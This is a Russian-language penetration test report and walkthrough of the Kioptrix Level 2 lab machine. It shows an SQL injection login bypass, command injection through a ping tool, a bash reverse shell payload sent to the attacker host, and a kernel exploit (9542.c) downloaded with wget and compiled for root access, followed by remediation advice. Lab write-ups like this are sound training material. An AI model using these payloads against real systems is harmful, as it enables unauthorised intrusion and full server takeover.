
# 📑 Отчет по тестированию на проникновение: Kioptrix Level 2

## 📊 1. Резюме для менеджмента (Executive Summary)
В ходе планового тестирования безопасности хоста `Kioptrix Level 2` была обнаружена критическая цепочка уязвимостей, позволившая удаленному злоумышленнику без аутентификации полностью захватить управление сервером.

**Ключевые векторы атаки:**
1. **Первичный доступ:** Небезопасная обработка пользовательского ввода на веб-сайте, приведшая к внедрению SQL-кода (SQL Injection) и обходу авторизации.
2. **Удаленное выполнение команд:** Веб-инструмент для пинга узлов оказался уязвим к внедрению команд ОС (Command Injection).
3. **Повышение прав:** Операционная система хоста использовала устаревшее ядро Linux (2.6.x), уязвимое к локальному повышению привилегий (класс уязвимостей Local Privilege Escalation).

## 🛠️ 2. Технический разбор (Technical Walkthrough)

### 🔍 Этап 1: Разведка (Reconnaissance)
Для определения открытых сетевых портов и доступных служб было запущено сканирование `nmap`:
```bash
nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn -oG all 192.168.246.134
nmap -sVC -p22,80,111,139,443,32768 -oN target 192.168.246.134
```

**Результаты сканирования (сокращенно):**

- Port - 22/tcp open  ssh      OpenSSH 3.9p1 (protocol 1.99)
- Port - 80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
- Port - 111/tcp  open  rpcbind  2
- Port - 443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
- Port - 631/tcp  open  ipp      CUPS 1.1
- Port - 788/tcp  open  status   1
- Port - 3306/tcp open  mysql    MySQL (unauthorized)


При переходе по адресу `http://192.168.246.134 была обнаружена кастомная форма входа администратора.

### 💥 Этап 2: Первичный доступ (Exploitation)

#### Обход авторизации (SQL Injection)
Проверка поля `Username` на наличие классической инъекции увенчалась успехом. Ввод конструкции `' OR 1=1 -- -` позволил обмануть логику SQL-запроса в базе данных.

*   **Логин:** `administrator' or 1=1 -- -`
*   **Пароль:** `Скопировал логин`

После отправки формы произошел успешный вход в закрытую панель управления под учетной записью администратора.

#### Внедрение команд (Command Injection)
Внутри административной панели был доступен веб-инструмент для проверки доступности сети (Ping IT). Скрипт принимает IP-адрес и выполняет системную команду `ping`. 

Из-за отсутствия фильтрации символа `;` (разделитель команд в Linux), была осуществлена атака **Command Injection**:
```text
127.0.0.1; id
```
Сервер вернул результат выполнения команды `id`, подтвердив выполнение кода от имени непривилегированного пользователя `apache`.

#### Получение Reverse Shell
Для получения интерактивного доступа в систему на атакующей машине было запущено прослушивание порта 443:
```bash
rlwrap nc -lvnp 443
```

В веб-интерфейс была отправлена следующая полезная нагрузка на базе Bash:
```text
192.168.1.50; bash -i >& /dev/tcp/192.168.246.128/443 0>&1
```
Соединение успешно установилось, получен первичный доступ к командной строке.

### 👑 Этап 3: Повышение привилегий (Privilege Escalation)

Анализ версии операционной системы и ядра Linux показал использование устаревшего ПО:
```bash
sh-3.00$ uname -a
Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i320 GNU/Linux
```

Основываясь на версии ядра и системы c помощью `searchsploit` был найден подходящий локальный эксплойт ядра для CentOS 4.5 — (CVE-2009-2698). Использовался эксплойт под номером `9542.c`.

1. Эксплойт был скачан на атакующую машину и передан на целевой хост через временный HTTP-сервер:
   ```bash
   # На атакующей машине: python3 -m http.server 80
   # На целевой машине в папке /tmp:
   wget http://192.168.246.128/9542.c
   ```
2. Компиляция исходного кода прямо на целевом сервере:
   ```bash
   gcc 9542.c -o rat
   ```
3. Запуск скомпилированного бинарника:
   ```bash
   ./rat
   ```

**Результат:**
```bash
# id
uid=0(root) gid=0(root) groups=0(root)
```
Получены максимальные привилегии `root`. Система успешно скомпрометирована.

## 🛡️ 4. Рекомендации по устранению (Remediation)

<details>
<summary><b>1. Безопасность веб-приложений (Развернуть детали)</b></summary>

*   **Проблема:** Отсутствие экранирования спецсимволов при формировании SQL-запросов и выполнении системных команд.
*   **Решение:**
    1. Использовать параметризованные запросы (Prepared Statements) для работы с базой данных MySQL, чтобы полностью исключить SQL-инъекции.
    2. Избегать вызова системных функций вроде `system()` или `exec()` в коде веб-панели. Для функции пинга использовать встроенные программные библиотеки языка, либо жестко фильтровать ввод пользователя с помощью регулярных выражений (разрешать ввод только цифр и точек).
</details>

<details>
<summary><b>2. Обновление операционной системы (Развернуть детали)</b></summary>

*   **Проблема:** Использование устаревшего ядра Linux 2.6.9, содержащего десятки публично доступных эксплойтов для повышения прав.
*   **Решение:** Списать данную ОС с эксплуатации (так как CentOS 4 полностью устарела). Перенести сервисы на актуальную версию ОС с долгосрочной поддержкой (LTS) и настроить процесс регулярного обновления ядра (`yum update` / `apt upgrade`).
</details>
